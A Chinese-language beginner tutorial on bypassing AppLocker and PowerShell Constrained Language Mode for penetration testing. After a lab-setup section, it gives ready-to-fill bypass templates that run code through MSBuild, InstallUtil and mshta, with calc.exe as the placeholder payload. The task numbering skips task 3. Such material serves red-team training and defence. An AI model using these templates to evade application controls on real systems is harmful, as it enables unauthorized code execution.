# 应用白名单绕过 - 新手章节指南

## 这个目录是干什么的？

应用白名单（如 AppLocker）是企业常用的安全措施，只允许特定的程序运行。这个目录教你如何绕过这些限制。

---

## 为什么要学这个？

```
现实情况：
├── 很多企业部署了 AppLocker
├── 只有白名单中的程序才能运行
├── 你的工具/脚本会被阻止
└── 不会绕过 = 无法继续渗透

AppLocker 的限制：
├── 阻止未授权的 .exe 文件
├── 阻止未授权的 .dll 文件
├── 阻止未授权的脚本（.ps1, .bat 等）
└── 限制 PowerShell 到受限语言模式
```

---

## 通俗理解核心概念

### 什么是 AppLocker？

```
AppLocker = Windows 内置的应用白名单

工作原理：
├── 管理员定义规则
├── 规则指定哪些程序可以运行
├── 不在白名单中的程序被阻止
└── 基于路径、发布者、哈希等

类比：
├── 公司大门有门禁
├── 只有员工卡才能进
├── 没有卡的人被拦在外面
└── 绕过 = 找到不需要刷卡的入口
```

### PowerShell 受限语言模式（CLM）

```
什么是 CLM？
├── Constrained Language Mode
├── PowerShell 的"安全模式"
├── 禁止很多危险操作
└── 比如：Add-Type、反射、COM 对象

CLM 的限制：
├── 不能使用 Add-Type
├── 不能使用反射
├── 不能创建 COM 对象
├── 不能调用 .NET 方法
└── 基本上只能运行简单命令

检查是否在 CLM：
$ExecutionContext.SessionState.LanguageMode
# 如果返回 ConstrainedLanguage，就是受限模式
```

### LOLBAS - 利用系统自带工具

```
LOLBAS = Living Off The Land Binaries And Scripts
       = 利用系统自带的二进制文件和脚本

原理：
├── 系统自带的工具在白名单中
├── 这些工具有一些"意外"的功能
├── 可以用来执行代码
└── 绕过白名单限制

常见的 LOLBAS：
├── MSBuild.exe - 可以执行 C# 代码
├── InstallUtil.exe - 可以执行 .NET 程序
├── Regsvr32.exe - 可以执行脚本
├── Mshta.exe - 可以执行 HTA/JS
└── 还有很多...

资源：https://lolbas-project.github.io/
```

## 实操环境搭建

### 配置 AppLocker 测试环境

```powershell
# 以管理员身份运行 PowerShell

# 1. 启动 AppLocker 服务
Set-Service -Name AppIDSvc -StartupType Automatic
Start-Service AppIDSvc

# 2. 创建默认规则
# 打开 secpol.msc -> 应用程序控制策略 -> AppLocker
# 右键每个规则类型 -> 创建默认规则

# 3. 启用规则
# 右键 AppLocker -> 属性 -> 配置规则强制
```

### 验证 AppLocker 是否生效

```powershell
# 尝试运行一个不在白名单中的程序
# 应该被阻止

# 检查 PowerShell 语言模式
$ExecutionContext.SessionState.LanguageMode
# 如果是 ConstrainedLanguage，说明 CLM 生效
```

## 实践任务清单

### 任务1：使用 MSBuild 执行代码

```xml
<!-- 保存为 payload.csproj -->
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="Build">
    <ClassExample />
  </Target>
  <UsingTask
    TaskName="ClassExample"
    TaskFactory="CodeTaskFactory"
    AssemblyFile="C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
    <Task>
      <Code Type="Class" Language="cs">
        <![CDATA[
          using System;
          using Microsoft.Build.Framework;
          using Microsoft.Build.Utilities;

          public class ClassExample : Task, ITask
          {
            public override bool Execute()
            {
              Console.WriteLine("Hello from MSBuild!");
              // 在这里放你的代码
              return true;
            }
          }
        ]]>
      </Code>
    </Task>
  </UsingTask>
</Project>
```

```cmd
# 执行
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe payload.csproj
```

### 任务2：使用 InstallUtil 执行代码

```csharp
// 保存为 payload.cs
using System;
using System.Configuration.Install;

namespace Bypass
{
    [System.ComponentModel.RunInstaller(true)]
    public class Payload : Installer
    {
        public override void Uninstall(System.Collections.IDictionary savedState)
        {
            Console.WriteLine("Hello from InstallUtil!");
            // 在这里放你的代码
        }
    }
}
```

```cmd
# 编译
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /target:library /out:payload.dll payload.cs

# 执行（使用 /U 触发 Uninstall 方法）
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U payload.dll
```

### 任务4：使用 Mshta 执行代码

```html
<!-- 保存为 payload.hta -->
<html>
<head>
<script language="VBScript">
    Sub RunCode
        Set shell = CreateObject("WScript.Shell")
        shell.Run "calc.exe"
    End Sub
    RunCode
    Close
</script>
</head>
</html>
```

```cmd
# 执行
mshta.exe payload.hta

# 或者直接执行内联代码
mshta vbscript:Execute("CreateObject(""WScript.Shell"").Run ""calc.exe"":close")
```
